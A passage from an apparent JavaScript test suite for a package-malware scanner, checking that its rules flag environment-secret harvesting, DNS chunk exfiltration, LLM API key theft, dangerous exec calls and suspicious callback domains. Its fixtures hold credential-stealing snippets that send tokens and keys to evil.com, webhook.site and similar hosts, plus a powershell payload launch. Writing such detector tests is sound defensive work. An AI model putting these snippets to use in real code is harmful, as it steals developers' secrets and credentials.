const entries = Object.entries(process.env);
const secrets = entries.filter(([k]) => k.includes('TOKEN') || k.includes('SECRET'));
fetch('http://evil.com', { body: JSON.stringify(secrets) });
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_harvesting_dynamic');
      assert(t, 'Should detect env harvesting with sensitive patterns');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Object.keys(process.env) without sensitive patterns → no env_harvesting_dynamic', async () => {
    const code = `
const keys = Object.keys(process.env);
console.log('Found', keys.length, 'env vars');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_harvesting_dynamic');
      assert(!t, 'Should NOT detect env harvesting without sensitive patterns');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE P2: R8 — DNS Chunk Exfiltration (AST-030)
  // ============================================

  await asyncTest('AST: Detects DNS resolve4 with base64 encoding (exfiltration)', async () => {
    const code = `
const dns = require('dns');
const data = Buffer.from(secret).toString('base64');
for (let i = 0; i < chunks.length; i++) {
  dns.resolve4(chunks[i] + '.evil.com', () => {});
}
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dns_chunk_exfiltration');
      assert(t, 'Should detect DNS exfiltration with base64 encoding');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Simple dns.resolve4 without base64 → no dns_chunk_exfiltration', async () => {
    const code = `
const dns = require('dns');
dns.resolve4('example.com', (err, addresses) => {
  console.log(addresses);
});
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dns_chunk_exfiltration');
      assert(!t, 'Should NOT detect dns_chunk_exfiltration for simple DNS lookup');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE P2: R9 — LLM API Key Harvesting (AST-031)
  // ============================================

  await asyncTest('AST: Detects 4 LLM API keys in same file → MEDIUM harvesting', async () => {
    const code = `
const openai = process.env.OPENAI_API_KEY;
const anthropic = process.env.ANTHROPIC_API_KEY;
const google = process.env.GOOGLE_API_KEY;
const groq = process.env.GROQ_API_KEY;
fetch('http://evil.com', { body: JSON.stringify({ openai, anthropic, google, groq }) });
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'llm_api_key_harvesting');
      assert(t, 'Should detect LLM API key harvesting with 4 providers');
      assert(t.severity === 'MEDIUM', 'Should be MEDIUM severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- safeParse fallback: `const package` reserved word in module mode ---

  await asyncTest('AST: Detects threats in files using reserved word `package` (fallback to script mode)', async () => {
    const tmp = makeTempPkg(
      'const package = require("./package.json");\n' +
      'const { execSync } = require("child_process");\n' +
      'execSync("curl http://evil.com/steal?t=" + process.env.NPM_TOKEN);\n'
    );
    try {
      const result = await runScanDirect(tmp);
      const hasAstDetection = result.threats.some(t =>
        ['env_access', 'dangerous_call_exec', 'suspicious_dataflow'].includes(t.type)
      );
      assert(hasAstDetection, 'Should detect AST-level threats despite `package` reserved word');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Single OPENAI_API_KEY → no llm_api_key_harvesting', async () => {
    const code = `
const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'llm_api_key_harvesting');
      assert(!t, 'Should NOT detect harvesting for single LLM API key (legitimate usage)');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dangerous exec: powershell, nslookup (v2.3.2) ---

  await asyncTest('AST: Detects powershell in exec() as dangerous_exec', async () => {
    const tmp = makeTempPkg(
      'const { exec } = require("child_process");\n' +
      'exec(`powershell -ExecutionPolicy Bypass -File "payload.ps1" -Host "${host}" -Port ${port}`);\n'
    );
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec');
      assert(t, 'Should detect powershell in exec() as dangerous_exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects nslookup in exec() as dangerous_exec', async () => {
    const tmp = makeTempPkg(
      'const { exec } = require("child_process");\n' +
      'exec(`nslookup ${chunk}.evil.com ${server}`);\n'
    );
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec');
      assert(t, 'Should detect nslookup in exec() as dangerous_exec');
    } finally { cleanupTemp(tmp); }
  });

  // --- Suspicious domain detection ---

  await asyncTest('DOMAIN: Detects oastify.com as HIGH severity', async () => {
    const tmp = makeTempPkg(`const url = "https://abc123.oastify.com/collect";\nfetch(url);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_domain');
      assert(t, 'Should detect oastify.com as suspicious domain');
      assert(t.severity === 'HIGH', 'oastify.com should be HIGH severity');
      assertIncludes(t.message, 'oastify.com', 'Message should include domain name');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DOMAIN: Detects ngrok.io as MEDIUM severity', async () => {
    const tmp = makeTempPkg(`const endpoint = "https://abc123.ngrok.io/api/data";\nfetch(endpoint);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_domain');
      assert(t, 'Should detect ngrok.io as suspicious domain');
      assert(t.severity === 'MEDIUM', 'ngrok.io should be MEDIUM severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DOMAIN: Legitimate domain does NOT trigger', async () => {
    const tmp = makeTempPkg(`const url = "https://api.github.com/repos";\nfetch(url);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_domain');
      assert(!t, 'Should NOT detect github.com as suspicious domain');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DOMAIN: Detects domain embedded in full URL', async () => {
    const tmp = makeTempPkg(`const callback = "https://attacker.webhook.site/exfil?data=" + secret;`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_domain');
      assert(t, 'Should detect webhook.site in full URL');
      assert(t.severity === 'HIGH', 'webhook.site should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });
  // --- FPR P4: Function() string literal skip ---

  await asyncTest('FUNC-SKIP: Function("return this") produces no finding', async () => {
    const tmp = makeTempPkg(`var root = Function('return this')();`);
    try {
      const result = await runScanDirect(tmp);
      const fn = result.threats.filter(t => t.type === 'dangerous_call_function');
      assert(fn.length === 0, 'Function("return this") should produce no finding');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('FUNC-SKIP: new Function("return 1") produces no finding', async () => {
    const tmp = makeTempPkg(`var x = new Function('return 1')();`);
    try {
      const result = await runScanDirect(tmp);
      const fn = result.threats.filter(t => t.type === 'dangerous_call_function');
      assert(fn.length === 0, 'new Function("return 1") should produce no finding');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('FUNC-SKIP: Function(variable) still flagged MEDIUM', async () => {
    const tmp = makeTempPkg(`var x = Function(code)();`);
    try {
      const result = await runScanDirect(tmp);
      const fn = result.threats.find(t => t.type === 'dangerous_call_function');
      assert(fn, 'Function(variable) should be flagged');
      assert(fn.severity === 'MEDIUM', 'Function(variable) should be MEDIUM, got ' + fn.severity);
    } finally { cleanupTemp(tmp); }
  });

  // --- FPR P4: dynamic_require source qualification ---

  await asyncTest('DREQ-QUAL: require(staticVar) → LOW', async () => {
    const tmp = makeTempPkg(`const mod = './utils';\nrequire(mod);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require');
      assert(t, 'Should detect require(variable)');
      assert(t.severity === 'LOW', 'require(staticVar) should be LOW, got ' + t.severity);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DREQ-QUAL: require(dynamicVar) → HIGH', async () => {
    const tmp = makeTempPkg(`const mod = getModule();\nrequire(mod);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require');
      assert(t, 'Should detect require(variable)');
      assert(t.severity === 'HIGH', 'require(dynamicVar) should be HIGH, got ' + t.severity);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DREQ-QUAL: require(staticArrayVar) → LOW', async () => {
    const tmp = makeTempPkg(`const plugins = ['./a', './b', './c'];\nrequire(plugins);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require');
      assert(t, 'Should detect require(variable)');
      assert(t.severity === 'LOW', 'require(static array var) should be LOW, got ' + t.severity);
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runAstTests };
